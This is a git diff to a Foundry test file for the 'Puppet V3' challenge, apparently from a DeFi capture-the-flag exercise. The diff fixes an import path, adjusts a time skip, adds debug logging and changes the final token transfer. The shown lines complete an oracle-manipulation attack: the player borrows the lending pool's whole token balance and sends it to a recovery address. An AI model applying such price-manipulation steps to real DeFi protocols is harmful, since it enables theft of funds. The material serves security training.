@@ -18,7 +18,8 @@ import {
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 import {
     ISwapRouter
-} from "@uniswap/v3-core/contracts/interfaces/ISwapRouter.sol";
+} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -160,16 +161,25 @@ contract PuppetV3Challenge is Test {
             })
         );
 
-        skip(114);
+        skip(113);
 
         uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
             LENDING_POOL_INITIAL_TOKEN_BALANCE
         );
 
+    // console.log(depositRequired);
+    // console.log(weth.balanceOf(player));
+    // console.log(token.balanceOf(player));
         weth.approve(address(lendingPool), depositRequired);
         lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
 
-        token.transfer(recovery, token.balanceOf(player));
+         console.log(weth.balanceOf(player));
+        console.log(token.balanceOf(player));
+
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+         console.log(weth.balanceOf(player));
+    console.log(token.balanceOf(player));
     }
 
     /**
